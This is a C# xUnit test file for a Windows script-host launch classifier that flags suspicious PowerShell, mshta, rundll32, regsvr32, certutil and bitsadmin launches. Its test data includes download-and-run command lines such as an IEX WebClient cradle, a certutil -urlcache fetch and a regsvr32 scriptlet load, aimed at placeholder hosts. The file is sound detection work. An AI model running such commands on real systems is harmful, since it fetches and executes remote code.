using WatchLattice.Common.Alerts;
using Xunit;

namespace WatchLattice.ScriptHostAudit.Tests;

public sealed class LaunchClassifierTests
{
    private static LaunchAssessment Assess(string newProcess, string? commandLine, string? parent = Events.Explorer, ScriptHostAuditOptions? options = null) =>
        new LaunchClassifier(options ?? new ScriptHostAuditOptions()).Assess(Events.Launch(1, newProcess, commandLine, parent));

    [Fact]
    public void AnOrdinaryLaunch_IsInfo_WithNoReasons()
    {
        var result = Assess(Events.PowerShell, "powershell.exe -NoProfile -File C:\\Scripts\\backup.ps1");
        Assert.Equal(AlertSeverity.Info, result.Severity);
        Assert.Empty(result.Reasons);
        Assert.Null(result.AllowedBy);
    }

    [Theory]
    [InlineData("powershell.exe -enc SQBFAFgA")]
    [InlineData("powershell.exe -e SQBFAFgA")]
    [InlineData("powershell.exe -ec SQBFAFgA")]
    [InlineData("powershell.exe -EncodedCommand SQBFAFgA")]
    [InlineData("powershell.exe /ENCODEDC SQBFAFgA")]
    [InlineData("\"powershell.exe\" \"-encod\" SQBFAFgA")]
    public void EncodedCommands_AreWarnings_InAnyAbbreviation(string commandLine)
    {
        var result = Assess(Events.PowerShell, commandLine);
        Assert.Equal(AlertSeverity.Warning, result.Severity);
        Assert.Contains(result.Reasons, r => r.Contains("encoded command", StringComparison.Ordinal));
    }

    [Theory]
    [InlineData("powershell.exe -ExecutionPolicy Bypass -File x.ps1")]
    [InlineData("powershell.exe -Command Get-Date -Format yyyy")]
    [InlineData("powershell.exe -Command \"Write-Output 'iexplore -end'\"")]
    public void OrdinaryFlags_AreNotMistakenForEncodedCommands(string commandLine) =>
        Assert.Equal(AlertSeverity.Info, Assess(Events.PowerShell, commandLine).Severity);

    [Theory]
    [InlineData("powershell.exe -w hidden -File x.ps1")]
    [InlineData("powershell.exe -WindowStyle Hidden -File x.ps1")]
    [InlineData("powershell.exe -win 1 -File x.ps1")]
    public void HiddenWindows_AreWarnings(string commandLine) =>
        Assert.Contains(Assess(Events.PowerShell, commandLine).Reasons, r => r.Contains("hides its window", StringComparison.Ordinal));

    [Theory]
    [InlineData(Events.PowerShell, "powershell.exe -c \"IEX (New-Object Net.WebClient).DownloadString('http://x')\"", "downloads from the network")]
    [InlineData(Events.PowerShell, "powershell.exe -c \"iex $s\"", "runs text as code")]
    [InlineData(Events.PowerShell, "powershell.exe -c [Convert]::FromBase64String($x)", "Base64")]
    [InlineData(@"C:\Windows\System32\mshta.exe", "mshta.exe https://example.invalid/a.hta", "HTML application from the network")]
    [InlineData(@"C:\Windows\System32\mshta.exe", "mshta.exe vbscript:Execute(\"x\")", "inline script")]
    [InlineData(@"C:\Windows\System32\rundll32.exe", "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"", "inline script")]
    [InlineData(@"C:\Windows\System32\regsvr32.exe", "regsvr32.exe /s /n /u /i:http://example.invalid/x.sct scrobj.dll", "script component")]
    [InlineData(@"C:\Windows\System32\certutil.exe", "certutil.exe -urlcache -split -f http://example.invalid/x.exe x.exe", "certutil")]
    [InlineData(@"C:\Windows\System32\bitsadmin.exe", "bitsadmin.exe /transfer job http://example.invalid/x C:\\x", "bitsadmin")]
    public void KnownAbusePatterns_AreWarnings(string host, string commandLine, string reason)
    {
        var result = Assess(host, commandLine);
        Assert.Equal(AlertSeverity.Warning, result.Severity);
        Assert.Contains(result.Reasons, r => r.Contains(reason, StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void HostSpecificPatterns_OnlyApplyToThatHost()
    {
        // certutil's -decode means nothing to rundll32, and an encoded flag means nothing to cscript.
        Assert.Equal(AlertSeverity.Info, Assess(@"C:\Windows\System32\rundll32.exe", "rundll32.exe shell32.dll,Control_RunDLL -decode").Severity);
        Assert.Equal(AlertSeverity.Info, Assess(@"C:\Windows\System32\cscript.exe", "cscript.exe //E:jscript -enc x.js").Severity);
    }

    [Fact]
    public void AnOfficeParent_IsAWarning_AndCritical_WithAnotherReason()
    {
        var plain = Assess(Events.PowerShell, "powershell.exe -File x.ps1", Events.Word);
        Assert.Equal(AlertSeverity.Warning, plain.Severity);
        Assert.Contains("an Office app", Assert.Single(plain.Reasons));

        var encoded = Assess(Events.PowerShell, "powershell.exe -nop -w hidden -enc SQBFAFgA", Events.Word);
        Assert.Equal(AlertSeverity.Critical, encoded.Severity);
        Assert.StartsWith("started by WINWORD.EXE", encoded.Reasons[0], StringComparison.Ordinal);
        Assert.Equal(3, encoded.Reasons.Count);
    }

    [Theory]
    [InlineData(@"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe", "a web browser")]
    [InlineData(@"C:\Windows\System32\wscript.exe", "another script host")]
    [InlineData(@"C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe", "a document reader")]
    public void OtherSuspiciousParents_SayWhatTheyAre(string parent, string kind) =>
        Assert.Contains(kind, Assert.Single(Assess(Events.PowerShell, "x", parent).Reasons));

    [Fact]
    public void AnInBoxHost_OutsideTheWindowsFolder_IsAWarning()
    {
        var result = Assess(@"C:\Users\alex\AppData\Local\Temp\powershell.exe", "powershell.exe");
        Assert.Equal(AlertSeverity.Warning, result.Severity);
        Assert.Contains(@"runs from C:\Users\alex\AppData\Local\Temp", Assert.Single(result.Reasons));

        // Hosts that are not part of Windows can live anywhere.
        Assert.Empty(Assess(@"C:\Program Files\PowerShell\7\pwsh.exe", "pwsh.exe").Reasons);
        Assert.Empty(Assess(@"C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe", "powershell.exe").Reasons);
        Assert.Empty(Assess(@"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe", "regasm.exe x.dll").Reasons);
        Assert.Empty(Assess(@"C:\Windows\hh.exe", "hh.exe help.chm").Reasons);
    }

    [Fact]
    public void BuiltInParents_CanBeTurnedOff_AndAddedTo()
    {
        var options = new ScriptHostAuditOptions { IncludeBuiltInSuspiciousParents = false, SuspiciousParents = new[] { "Code.exe" } };
        Assert.Equal(AlertSeverity.Info, Assess(Events.PowerShell, "x", Events.Word, options).Severity);
        Assert.Contains("listed in SuspiciousParents", Assert.Single(Assess(Events.PowerShell, "x", Events.VsCode, options).Reasons));
    }

    [Fact]
    public void AllowedLaunches_MatchByFileNameOrFullPath()
    {
        var options = new ScriptHostAuditOptions
        {
            AllowedLaunches = new[]
            {
                @"C:\Users\*\AppData\Local\Programs\Microsoft VS Code\Code.exe|powershell.exe|*",
                "WINWORD.EXE|powershell.exe|powershell.exe -File C:\\Macros\\*.ps1",
                "not a rule",
            },
        };
        Assert.Single(LaunchClassifier.InvalidRules(options));

        Assert.Equal(options.AllowedLaunches[0], Assess(Events.PowerShell, "powershell.exe -enc x", Events.VsCode, options).AllowedBy);
        Assert.Equal(options.AllowedLaunches[1], Assess(Events.PowerShell, "powershell.exe -File C:\\Macros\\report.ps1", Events.Word, options).AllowedBy);
        Assert.Null(Assess(Events.PowerShell, "powershell.exe -File C:\\Temp\\report.ps1", Events.Word, options).AllowedBy);
        // A copy of Code.exe somewhere else is not the allowed parent.
        Assert.Null(Assess(Events.PowerShell, "x", @"C:\Users\alex\Downloads\Code.exe", options).AllowedBy);
        // The severity is kept, so the log still says what was allowed.
        Assert.Equal(AlertSeverity.Warning, Assess(Events.PowerShell, "powershell.exe -enc x", Events.VsCode, options).Severity);
    }

    [Fact]
    public void AnAllowRuleWithAParent_NeedsARecordedParent()
    {
        var options = new ScriptHostAuditOptions { AllowedLaunches = new[] { "explorer.exe|powershell.exe|" } };
        Assert.NotNull(Assess(Events.PowerShell, "x", Events.Explorer, options).AllowedBy);
        Assert.Null(Assess(Events.PowerShell, "x", parent: null, options).AllowedBy);
        Assert.NotNull(new LaunchClassifier(new ScriptHostAuditOptions { AllowedLaunches = new[] { "|powershell.exe|" } })
            .Assess(Events.Launch(1, Events.PowerShell, "x", parent: null)).AllowedBy);
    }
}
